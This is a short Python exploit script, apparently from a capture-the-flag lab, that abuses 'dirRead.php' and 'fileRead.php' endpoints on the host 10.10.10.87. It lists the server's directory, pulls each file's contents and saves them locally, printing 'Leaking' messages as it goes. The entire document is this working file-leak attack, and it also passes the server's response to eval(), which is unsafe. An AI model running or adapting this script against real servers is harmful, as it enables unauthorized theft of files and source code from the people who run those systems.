from requests import *
from json import *

s = session()
host = 'http://10.10.10.87/'
dirRead = 'dirRead.php'
fileRead = 'fileRead.php'

resp = s.post(host + dirRead, data={'path':'./'})
l = eval(resp.text)

for name in l:
    print ("[*] Leaking {}".format(name))
    resp = s.post(host + fileRead, data={'file':name})
    try:
        text = loads(resp.text)
    except:
        continue

    if text['file'] != '':
        print ("[+] Saved as {} bytes in {}".format(len(text['file']), name))
        with open(name, 'w') as f:
            f.write(text['file'])
